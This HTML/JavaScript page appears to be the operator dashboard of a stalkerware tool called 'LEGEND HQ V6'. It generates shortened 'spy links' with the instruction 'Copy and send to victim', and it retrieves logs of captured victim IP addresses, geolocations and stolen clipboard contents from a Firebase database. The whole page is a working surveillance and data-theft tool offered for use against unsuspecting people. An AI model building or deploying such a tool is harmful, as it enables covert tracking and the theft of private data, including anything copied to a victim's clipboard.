<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MA LEGEND | ULTIMATE HQ</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Poppins:wght@400;600&display=swap');
        body { background: #e0e5ec; font-family: 'Poppins', sans-serif; color: #44476a; padding: 15px; display: flex; justify-content: center; }
        .container { width: 100%; max-width: 800px; }
        .neu-card { background: #e0e5ec; padding: 25px; border-radius: 30px; box-shadow: 9px 9px 16px #bcbfc5, -9px -9px 16px #ffffff; margin-bottom: 25px; }
        h2 { font-family: 'Orbitron'; color: #00a884; text-align: center; margin-bottom: 10px; }
        input { width: 100%; padding: 12px; border: none; border-radius: 12px; background: #e0e5ec; box-shadow: inset 4px 4px 8px #cbcbe1, inset -4px -4px 8px #ffffff; outline: none; margin: 8px 0; box-sizing: border-box; }
        .btn { width: 100%; padding: 12px; border: none; border-radius: 15px; background: #e0e5ec; box-shadow: 6px 6px 12px #bcbfc5, -6px -6px 12px #ffffff; color: #00a884; font-weight: bold; cursor: pointer; font-family: 'Orbitron'; margin-top: 10px; transition: 0.3s; }
        .btn:active { box-shadow: inset 3px 3px 6px #bcbfc5, inset -3px -3px 6px #ffffff; }
        .tabs { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
        .log-card { background: #e0e5ec; padding: 15px; border-radius: 20px; box-shadow: 6px 6px 12px #bcbfc5, -6px -6px 12px #ffffff; margin-top: 15px; border-left: 6px solid #00a884; font-size: 0.85rem; }
        .clip-card { border-left-color: #f0ad4e; }
        .row { display: flex; justify-content: space-between; padding: 4px 0; border-bottom: 1px solid rgba(0,0,0,0.05); }
        pre { background: #1e1e1e; color: #00ffcc; padding: 10px; border-radius: 10px; overflow-x: auto; white-space: pre-wrap; font-size: 0.8rem; }
    </style>
</head>
<body>
    <div class="container">
        <div class="neu-card">
            <h2>LEGEND HQ V6</h2>
            <input type="text" id="masterKey" placeholder="Enter Secret Key (e.g. Legend786)">
            
            <div class="tabs">
                <button class="btn" onclick="fetchLogs('tracking')">LOCATIONS</button>
                <button class="btn" onclick="fetchLogs('clipboard')">CLIPBOARD</button>
            </div>

            <input type="text" id="targetUrl" placeholder="Redirect to (e.g. https://youtube.com)">
            <button class="btn" style="background: #00a884; color: white;" onclick="generateLink()">GENERATE SPY LINK</button>
            
            <div id="linkResult" style="display:none; margin-top:15px;">
                <input type="text" id="finalLink" readonly>
                <p style="font-size: 10px; text-align:center;">Copy and send to victim</p>
            </div>
        </div>

        <div id="displayArea"></div>
    </div>

    <script>
        const DB_URL = "https://location-5d435-default-rtdb.firebaseio.com/";

        async function generateLink() {
            const key = document.getElementById('masterKey').value.trim();
            const url = document.getElementById('targetUrl').value.trim() || "https://google.com";
            if(!key) return alert("Key lazmi hai!");
            
            const longLink = `https://your-vercel-app.vercel.app/?id=${btoa(key + "|" + url)}`;
            // Shorten link (Optional)
            const res = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(longLink)}`);
            document.getElementById('finalLink').value = await res.text();
            document.getElementById('linkResult').style.display = 'block';
        }

        async function fetchLogs(path) {
            const key = document.getElementById('masterKey').value.trim();
            if(!key) return alert("Key daalein!");
            
            const area = document.getElementById('displayArea');
            area.innerHTML = "<h4>Searching Database...</h4>";
            
            const res = await fetch(`${DB_URL}${path}/${key}.json`);
            const data = await res.json();
            
            area.innerHTML = `<h3>${path.toUpperCase()} DATA</h3>`;
            if(!data) return area.innerHTML += "<p>No logs found yet.</p>";

            Object.keys(data).reverse().forEach(id => {
                const item = data[id];
                if(path === 'tracking') {
                    area.innerHTML += `
                        <div class="log-card">
                            <div class="row"><b>Time:</b> ${item.time}</div>
                            <div class="row"><b>IP:</b> ${item.ip}</div>
                            <div class="row"><b>Loc:</b> ${item.loc}</div>
                            <a href="${item.map}" target="_blank" style="color:#00a884; font-weight:bold;">üìç Open in Maps</a>
                        </div>`;
                } else {
                    area.innerHTML += `
                        <div class="log-card clip-card">
                            <div class="row"><b>Captured:</b> ${item.time}</div>
                            <pre>${item.clipData}</pre>
                        </div>`;
                }
            });
        }
    </script>
</body>
</html>
